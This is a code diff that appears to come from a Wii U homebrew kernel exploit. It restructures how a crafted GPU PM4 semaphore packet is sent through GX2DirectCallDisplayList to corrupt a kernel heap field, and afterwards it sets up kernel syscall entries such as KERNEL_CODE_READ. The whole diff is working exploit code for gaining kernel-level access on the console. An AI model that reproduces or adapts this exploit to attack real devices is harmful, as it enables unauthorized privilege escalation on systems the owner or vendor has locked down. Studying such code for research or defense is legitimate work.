@@ -93,6 +93,16 @@ void _start()
 
 	DCFlushRange(heap_blk, 0x10);
 
+	OSContext *thread1 = (OSContext*)OSAllocFromSystem(0x1000, 32);
+	uint32_t *tdstack1 = (uint32_t *)OSAllocFromSystem(0x1000, 4);
+
+	/* *** Shutdown GX2 on its running core *** */
+	OSCreateThread(thread1, GX2Shutdown, 0, NULL, tdstack1 + 0x400, 0x1000, 0, (1 << GX2GetMainCoreId()) | 0x10);
+	OSResumeThread(thread1);
+
+	/* Wait a bit */
+	wait();
+
 	/* Crafting our GPU packet */
 	uint32_t *pm4_packet = (uint32_t *)OSAllocFromSystem(32, 32);
 	pm4_packet[0] = make_pm4_type3_packet_header(MEM_SEMAPHORE, 2);	// 0xC0013900 | PM4 type3 packet header for Semaphore operations
@@ -105,24 +115,13 @@ void _start()
 
 	DCFlushRange(pm4_packet, 32);
 
-	OSContext *thread1 = (OSContext*)OSAllocFromSystem(0x1000, 32);
-	uint32_t *tdstack1 = (uint32_t *)OSAllocFromSystem(0x1000, 4);
+	GX2Init(NULL);
+	ScreenInit();
 
-	OSContext *thread2 = (OSContext*)OSAllocFromSystem(0x1000, 32);
-	uint32_t *tdstack2 = (uint32_t *)OSAllocFromSystem(0x1000, 4);
+	GX2DirectCallDisplayList(pm4_packet, 32); // += 0x01000000
+	GX2DirectCallDisplayList(pm4_packet, 32); // += 0x01000000
 
-	/* *** Shutdown GX2 on its running core *** */
-	OSCreateThread(thread1, GX2Shutdown, 0, NULL, tdstack1 + 0x400, 0x1000, 0, (1 << GX2GetMainCoreId()) | 0x10);
-	OSResumeThread(thread1);
-	wait();
-
-	/* Incrememnt heap_ctx->first_index by 0x02000000 (L197) */
-	OSCreateThread(thread2, main_code, 1, pm4_packet, tdstack2 + 0x400, 0x1000, 0, 2 | 0x10);
-	OSResumeThread(thread2);
-
-	/* Waiting for the thread to exit */
-	int rc;
-	OSJoinThread(thread2, &rc);
+	GX2Flush();
 
 	uint32_t *syscalls = OSAllocFromSystem(20, 4);
 	syscalls[0] = KERNEL_CODE_READ;		// Syscall 0x34
@@ -191,24 +190,6 @@ void _start()
 	while(1);
 
 }
-
-
-void main_code(uint32_t useless, uint32_t *packet)
-{
-
-	wait();
-
-	GX2Init(NULL);
-	ScreenInit();
-
-	GX2DirectCallDisplayList(packet, 32);
-	GX2DirectCallDisplayList(packet, 32);
-	GX2Flush();
-
-	OSExitThread(0);
-
-}
-
 
 void wait()
 {
